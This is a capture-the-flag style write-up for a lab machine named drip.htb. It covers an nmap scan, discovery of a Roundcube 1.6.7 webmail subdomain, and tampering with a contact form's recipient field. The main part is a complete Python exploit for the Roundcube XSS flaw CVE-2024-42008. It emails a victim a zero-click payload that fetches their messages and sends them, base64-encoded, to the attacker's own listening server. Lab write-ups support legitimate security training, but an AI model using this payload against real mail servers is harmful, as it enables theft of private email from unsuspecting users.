1,Recon
port scan
```
PORT    STATE SERVICE       VERSION
22/tcp  open  ssh           OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp  open  http          nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-10T05:11:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```
Page check 
![](images/Pasted%20image%2020250210161437.png)
There is another sub-domain `mail.drip.htb` for `sign in` page
![](images/Pasted%20image%2020250210161625.png)
Then we can register an account to login.
![](images/Pasted%20image%2020250213162438.png)
When we successfully login to the dashboard, we can find the version of this service 
`Roundcube Webmail 1.6.7`
![](images/Pasted%20image%2020250213162550.png)
By searching the exploits of this service, we can find a XSS vulner here.
![](images/Pasted%20image%2020250213162805.png)
Let's look at the default email headers and note the `drip.darkcorp.htb` domain :
```
Return-Path: <no-reply@drip.htb>  
Delivered-To: root@drip.htb  
Received: from drip.htb  
    by drip.darkcorp.htb with LMTP  
    id EHcECx+CrWd/QQIA8Y1rLw  
    (envelope-from <no-reply@drip.htb>)  
    for <root@drip.htb>; Wed, 12 Feb 2025 22:24:47 -0700  
Received: from drip.darkcorp.htb (localhost [127.0.0.1])  
    by drip.htb (Postfix) with ESMTP id 2BEA52397  
    for <root@drip.htb>; Wed, 12 Feb 2025 22:24:47 -0700 (MST)  
Content-Type: text/plain; charset="utf-8"  
MIME-Version: 1.0  
Content-Transfer-Encoding: 8bit  
Subject: Welcome to DripMail!  
From: no-reply@drip.htb  
To: root@drip.htb  
Date: Wed, 12 Feb 2025 22:24:47 -0700  
Message-ID: <173942428714.630.5808751956165052919@drip.darkcorp.htb>  
Reply-To: support@drip.htb
```
Let's try to send ourselves a letter from a form on the site and intercept the request via Burp Suite:
![](images/Pasted%20image%2020250213163729.png)
![](images/Pasted%20image%2020250213163811.png)
Then we just need to change `recipient=support%40drip.htb` into `recipient=root%40drip.htb`, then we can get the answer from the email dashboard.
![](images/Pasted%20image%2020250213163935.png)
There is another email here and we can try to exploit the XSS exploit to this user `bcase@drip.htb`

This version of Roundcube allows you to do XSS with 0-click. We will use CVE-2024-42008 and
repeat this video , and we will take the description of the vulnerabilities from the article .
`https://www.youtube.com/watch?v=X7UX7b7Tkrk`
And there is an article `https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/`

Let's take a script from the guys from a well-known forum and modify it a little:
```
import argparse
import base64
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
from lxml import html

# Argument parser setup
parser = argparse.ArgumentParser()
parser.add_argument("-m", "--message", required=True, type=int, help="Message number")
parser.add_argument("-i", "--ip", required=True, help="Our HTTP Server IP")
parser.add_argument("-p", "--port", type=int, required=True, help="Our HTTP Server PORT")
args = parser.parse_args()

LISTEN_IP = args.ip
LISTEN_PORT = args.port
MESSAGE_NUMBER = args.message

# Configuration
TARGET_URL = "http://drip.htb/contact"
PLACEHOLDER = f"{LISTEN_IP}:{LISTEN_PORT}"

# Payload for the POST request
start_msg = (
    "<body title=\"bgcolor=foo\" name=\"bar style=animation-name:progressbar-stripes "
    "onanimationstart=fetch('/?_task=mail&_action=show&_uid="
)
end_msg = (
    "&_mbox=INBOX&_extwin=1').then(r => r.text()).then(t => "
    f"fetch(`http://{PLACEHOLDER}/c=${{btoa(t)}}`)) foo=bar">Foo body></body>"
)

post_data = {
    "name": "root",
    "email": "root@drip.htb",
    "message": f"{start_msg}{MESSAGE_NUMBER}{end_msg}",
    "content": "html",
    "recipient": "bcase@drip.htb",
}

headers = {
    "Host": "drip.htb",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://drip.htb",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/123.0.6312.122 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp," 
               "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://drip.htb/index",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "session=eyJfZnJlc2giOmZhbHNlfQ.Z6fOBw.u9iWIiki2cUK55mmcizrzU5EJzE",
    "Connection": "close",
}

# Function to send the POST request
def send_post():
    response = requests.post(TARGET_URL, data=post_data, headers=headers)
    print(f"[+] POST Request Sent! Status Code: {response.status_code}")

# Custom HTTP request handler to capture and decode the incoming data
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded_data = self.path.split('/c=')[1]
            decoded_data = base64.b64decode(encoded_data).decode('latin-1')
            
            tree = html.fromstring(decoded_data)
            message_body = tree.xpath('//div[@id="messagebody"]')
            
            if message_body:
                message_text = message_body[0].text_content().strip()
                print("[+] Extracted Message Body Content:\n")
                print(message_text)
            else:
                print("[!] No div with id 'messagebody' found.")
        else:
            print("[!] Received request but no data found.")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def log_message(self, format, *args):
        return  # Suppress default logging

# Function to start the HTTP server
def start_server():
    server_address = (LISTEN_IP, LISTEN_PORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[+] Listening on {LISTEN_IP}:{LISTEN_PORT} for exfiltrated data")
    httpd.serve_forever()

# Run the HTTP server in a separate thread
server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

# Send the POST request
send_post()

# Keep the main thread alive to continue listening
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Stopping server.")

```